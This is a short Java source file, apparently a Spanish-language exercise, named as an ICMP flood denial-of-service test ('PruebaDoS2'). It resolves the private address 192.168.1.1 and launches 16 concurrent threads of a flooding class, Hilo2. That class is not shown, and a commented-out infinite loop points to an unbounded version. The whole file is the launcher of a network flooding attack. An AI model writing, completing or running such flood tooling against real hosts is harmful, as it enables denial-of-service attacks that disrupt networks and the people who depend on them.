package ICMP_Flood_2;

import java.io.IOException;
import java.net.InetAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PruebaDoS2 {

    public static void main(String[] args) throws IOException {
        InetAddress servidor;
        ExecutorService pool = Executors.newFixedThreadPool(16);
        try {
            servidor = InetAddress.getByName("192.168.1.1");
            System.out.println("Obtenida ip del servidor");
            System.out.println(servidor);
            //while(true){
            for(int i=0; i<16; i++){
                pool.execute(new Hilo2(servidor));
            }
        } catch (IOException e) {
            System.out.println("Error al conectarse con el servidor");
            pool.shutdown();
            System.exit(0);
        }
    }
}
